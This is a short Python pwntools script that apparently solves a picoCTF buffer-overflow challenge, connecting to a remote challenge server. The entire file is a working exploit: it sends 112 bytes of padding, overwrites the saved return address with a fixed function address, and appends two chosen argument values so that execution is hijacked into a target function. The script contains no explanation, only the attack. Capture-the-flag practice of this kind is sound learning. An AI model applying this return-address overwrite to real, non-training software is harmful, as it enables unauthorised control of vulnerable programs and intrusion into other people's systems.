from pwn import *

# p = process('./vuln')
p = remote('saturn.picoctf.net', 54731)
ret_add = p32(0x08049296)
a1 = p32(0xcafef00d)
b1 = p32(0xf00df00d)

payload = b'A'*112 + ret_add + b'AAA%' + a1 + b1
print(payload)

p.sendline(payload)
print(p.recv())
print(p.recv())
# p.interactive()